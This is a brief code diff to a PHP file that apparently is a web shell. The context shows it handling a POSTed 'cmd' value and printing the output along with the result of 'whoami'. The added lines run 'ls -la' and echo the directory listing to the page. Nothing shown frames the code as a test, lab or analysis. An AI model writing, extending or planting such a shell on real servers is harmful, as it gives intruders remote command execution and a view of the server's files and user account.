@@ -28,6 +28,14 @@ if (isset($_POST['cmd'])) {
     echo '</pre>';
 }
 
+echo '<hr>';
+exec('ls -la', $output);
+echo '<pre>';
+foreach ($output as $line) {
+    echo $line.PHP_EOL;
+}
+echo '</pre>';
+
 ?>
 <hr>
 <strong><?= exec('whoami') ?></strong>
